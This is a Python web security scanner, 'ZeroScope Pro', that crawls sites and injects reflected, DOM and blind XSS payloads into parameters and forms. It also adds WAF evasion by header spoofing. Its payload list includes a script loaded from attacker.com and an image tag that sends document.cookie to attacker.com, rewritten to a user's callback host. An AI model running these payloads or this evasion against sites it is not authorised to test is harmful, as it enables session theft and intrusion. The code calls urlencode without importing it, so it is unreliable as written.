#!/usr/bin/env python3
"""
ZeroScope Pro - Enhanced XSS Scanner
"""

import argparse
import requests
from urllib.parse import urljoin, urlparse, quote, parse_qs, urlunparse
from bs4 import BeautifulSoup
import re
from colorama import Fore, Style, init
import threading
import queue
import random
import time

class XSSScanner:
    def __init__(self, config=None):
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': random.choice(self.config.get('user_agents', [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Mozilla/5.0 (Linux; Android 10)',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)'
            ]))
        })
        self.payloads = self._load_payloads()
        self.vulnerabilities = []
        self.lock = threading.Lock()
        self.waf_detected = False

    def _load_payloads(self):
        """Load XSS payloads with context-specific tests"""
        return {
            'reflected': [
                ('<script>alert("XSS")</script>', 'Basic script tag'),
                ('" onmouseover=alert("XSS")', 'Event handler'),
                ('"><svg/onload=alert("XSS")>', 'Tag breakout'),
                ('javascript:alert("XSS")', 'JS URI')
            ],
            'dom': [
                ('#<script>alert("XSS")</script>', 'DOM Injection'),
                ('#javascript:alert("XSS")', 'JS URI Injection'),
                ('#"><img src=x onerror=alert("XSS")>', 'DOM Breakout')
            ],
            'blind': [
                ('<script src="//attacker.com/xss.js"></script>', 'Basic blind'),
                ('<img src=x onerror="fetch(\'//attacker.com/log?c=\'+document.cookie)">', 'Cookie exfil')
            ]
        }

    def scan(self, url, crawl=False, blind_callback=None, verbose=False):
        """Main scanning function"""
        self.waf_detected = self._detect_waf(url)
        if self.waf_detected:
            print(f"{Fore.YELLOW}[!] WAF Detected - Applying evasion techniques{Style.RESET_ALL}")
            self._apply_evasion()

        if crawl:
            self._crawl_and_scan(url, blind_callback, verbose)
        else:
            self._scan_url(url, blind_callback, verbose)

    def _detect_waf(self, url):
        """Detect if WAF is present"""
        test_payloads = ["' OR 1=1--", "<script>alert(1)</script>"]
        blocked = 0
        
        for payload in test_payloads:
            try:
                res = self.session.get(url + payload, timeout=5)
                if res.status_code == 403 or any(waf_word in res.text.lower() for waf_word in ['cloudflare', 'akamai', 'waf']):
                    blocked += 1
            except:
                continue
                
        return blocked / len(test_payloads) > 0.5

    def _apply_evasion(self):
        """Apply WAF evasion techniques"""
        self.session.headers.update({
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'User-Agent': random.choice(self.config.get('user_agents', []))
        })

    def _crawl_and_scan(self, start_url, blind_callback, verbose):
        """Crawl and scan the website"""
        url_queue = queue.Queue()
        url_queue.put(start_url)
        visited = set()

        def worker():
            while True:
                try:
                    url = url_queue.get_nowait()
                    if url not in visited:
                        visited.add(url)
                        self._scan_url(url, blind_callback, verbose)
                        
                        # Find new links
                        try:
                            res = self.session.get(url)
                            soup = BeautifulSoup(res.text, 'html.parser')
                            for link in soup.find_all('a', href=True):
                                absolute = urljoin(url, link['href'])
                                if urlparse(absolute).netloc == urlparse(start_url).netloc:
                                    url_queue.put(absolute)
                        except:
                            continue
                    url_queue.task_done()
                except queue.Empty:
                    break

        # Start worker threads
        threads = []
        for _ in range(5):  # Use 5 threads for crawling
            t = threading.Thread(target=worker)
            t.start()
            threads.append(t)
        
        url_queue.join()

    def _scan_url(self, url, blind_callback, verbose):
        """Scan a single URL for XSS vulnerabilities"""
        # Test reflected XSS
        self._test_reflected_xss(url, verbose)
        
        # Test DOM XSS
        self._test_dom_xss(url, verbose)
        
        # Test blind XSS if callback provided
        if blind_callback:
            self._test_blind_xss(url, blind_callback, verbose)

    def _test_reflected_xss(self, url, verbose):
        """Test for reflected XSS vulnerabilities"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # Test with default parameter if none exist
            for payload, payload_type in self.payloads['reflected']:
                test_url = f"{url}?test={quote(payload)}"
                try:
                    response = self.session.get(test_url)
                    if self._is_payload_reflected(response.text, payload):
                        self._log_vulnerability(
                            url=test_url,
                            vuln_type=f"Reflected XSS ({payload_type})",
                            severity="High",
                            payload=payload
                        )
                except Exception as e:
                    if verbose:
                        print(f"{Fore.RED}[!] Error testing reflected XSS: {e}{Style.RESET_ALL}")
        else:
            # Test all existing parameters
            for param in params:
                for payload, payload_type in self.payloads['reflected']:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                    
                    try:
                        response = self.session.get(test_url)
                        if self._is_payload_reflected(response.text, payload):
                            self._log_vulnerability(
                                url=test_url,
                                vuln_type=f"Reflected XSS in {param} ({payload_type})",
                                severity="High",
                                payload=payload
                            )
                    except Exception as e:
                        if verbose:
                            print(f"{Fore.RED}[!] Error testing parameter {param}: {e}{Style.RESET_ALL}")

    def _test_dom_xss(self, url, verbose):
        """Test for DOM XSS vulnerabilities"""
        # First check for DOM XSS indicators
        try:
            response = self.session.get(url)
            dom_patterns = {
                'document.write': 'Direct HTML Injection',
                'innerHTML': 'HTML Sink',
                'eval(': 'JS Execution'
            }
            
            for pattern, desc in dom_patterns.items():
                if pattern in response.text:
                    self._log_vulnerability(
                        url=url,
                        vuln_type=f"Potential DOM XSS ({desc})",
                        severity="Medium",
                        payload=pattern
                    )
        except Exception as e:
            if verbose:
                print(f"{Fore.RED}[!] Error checking DOM indicators: {e}{Style.RESET_ALL}")
        
        # Test with DOM payloads
        for payload, payload_type in self.payloads['dom']:
            test_url = f"{url}{payload}"
            try:
                response = self.session.get(test_url)
                if self._is_dom_executed(response.text):
                    self._log_vulnerability(
                        url=test_url,
                        vuln_type=f"DOM XSS ({payload_type})",
                        severity="High",
                        payload=payload
                    )
            except Exception as e:
                if verbose:
                    print(f"{Fore.RED}[!] Error testing DOM payload: {e}{Style.RESET_ALL}")

    def _test_blind_xss(self, url, callback, verbose):
        """Test for blind XSS vulnerabilities"""
        for payload, payload_type in self.payloads['blind']:
            formatted_payload = payload.replace('attacker.com', callback)
            try:
                # Test in URL
                self.session.get(f"{url}?test={quote(formatted_payload)}")
                
                # Test in forms if any
                response = self.session.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                for form in soup.find_all('form'):
                    form_data = {inp.get('name', 'field'): formatted_payload 
                               for inp in form.find_all('input')}
                    action = urljoin(url, form.get('action', url))
                    
                    if form.get('method', 'get').lower() == 'post':
                        self.session.post(action, data=form_data)
                    else:
                        self.session.get(action, params=form_data)
            except Exception as e:
                if verbose:
                    print(f"{Fore.RED}[!] Error testing blind XSS: {e}{Style.RESET_ALL}")

    def _is_payload_reflected(self, response_text, payload):
        """Check if payload is reflected in response"""
        return payload in response_text

    def _is_dom_executed(self, response_text):
        """Check for signs of DOM XSS execution"""
        indicators = ['<script>', 'alert(', 'onerror=', 'javascript:']
        return any(indicator in response_text for indicator in indicators)

    def _log_vulnerability(self, url, vuln_type, severity, payload):
        """Log found vulnerabilities"""
        with self.lock:
            self.vulnerabilities.append({
                'url': url,
                'type': vuln_type,
                'severity': severity,
                'payload': payload
            })
            
            # Print immediately if not crawling
            print(f"\n{Fore.GREEN}[+] {vuln_type}{Style.RESET_ALL}")
            print(f"URL: {url}")
            print(f"Severity: {self._color_severity(severity)}")
            print(f"Payload: {Fore.MAGENTA}{payload}{Style.RESET_ALL}")

    def _color_severity(self, severity):
        """Colorize severity levels"""
        if severity.lower() in ['high', 'critical']:
            return f"{Fore.RED}{severity}{Style.RESET_ALL}"
        elif severity.lower() == 'medium':
            return f"{Fore.YELLOW}{severity}{Style.RESET_ALL}"
        return f"{Fore.GREEN}{severity}{Style.RESET_ALL}"


class ZeroScope:
    def __init__(self):
        init()
        self.banner = f"""{Fore.CYAN}
███████╗███████╗██████╗ ░█████╗ ░██████╗░█████╗░░█████╗░██████╗░███████╗
╚════██║██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝
░░███╔═╝█████╗░░██████╔╝██║░░██║╚█████╗░██║░░╚═╝██║░░██║██████╔╝█████╗░░
██╔══╝░░██╔══╝░░██╔══██╗██║░░██║░╚═══██╗██║░░██╗██║░░██║██╔═══╝░██╔══╝░░
███████╗███████╗██║░░██║╚█████╔╝██████╔╝╚█████╔╝╚█████╔╝██║░░░░░███████╗
╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚══════╝
{Style.RESET_ALL}"""
        self.scanner = XSSScanner()

    def scan(self, url, scan_type, options):
        """Handle scanning based on type"""
        print(self.banner)
        print(f"{Fore.GREEN}[+] Starting {scan_type} scan of {url}{Style.RESET_ALL}")
        
        if scan_type == 'xss':
            self.scanner.scan(
                url=url,
                crawl=options.get('crawl', False),
                blind_callback=options.get('blind'),
                verbose=options.get('verbose', False)
            )
        elif scan_type == 'sqli':
            # SQLi scanning logic would go here
            pass

        self._report_results()

    def _report_results(self):
        """Generate final report"""
        if not self.scanner.vulnerabilities:
            print(f"\n{Fore.GREEN}[✓] No vulnerabilities found{Style.RESET_ALL}")
            return
            
        print(f"\n{Fore.CYAN}=== Scan Results ==={Style.RESET_ALL}")
        print(f"{Fore.RED}[!] Found {len(self.scanner.vulnerabilities)} vulnerabilities:{Style.RESET_ALL}")
        
        for i, vuln in enumerate(self.scanner.vulnerabilities, 1):
            print(f"\n{i}. {Fore.CYAN}{vuln['url']}{Style.RESET_ALL}")
            print(f"   Type: {vuln['type']}")
            print(f"   Severity: {self.scanner._color_severity(vuln['severity'])}")
            print(f"   Payload: {Fore.MAGENTA}{vuln['payload']}{Style.RESET_ALL}")


def main():
    parser = argparse.ArgumentParser(description='ZeroScope Pro Web Security Scanner')
    subparsers = parser.add_subparsers(dest='command', required=True)
    
    # XSS command
    xss_parser = subparsers.add_parser('xss', help='XSS scanning')
    xss_parser.add_argument('-u', '--url', required=True, help='Target URL')
    xss_parser.add_argument('--crawl', action='store_true', help='Enable crawling')
    xss_parser.add_argument('--blind', help='Callback URL for blind XSS')
    xss_parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    # SQLi command (placeholder)
    sqli_parser = subparsers.add_parser('sqli', help='SQL injection scanning')
    sqli_parser.add_argument('-u', '--url', required=True, help='Target URL')
    
    args = parser.parse_args()
    
    tool = ZeroScope()
    tool.scan(
        url=args.url,
        scan_type=args.command,
        options={
            'crawl': args.crawl,
            'blind': args.blind,
            'verbose': args.verbose
        }
    )

if __name__ == "__main__":
    main()
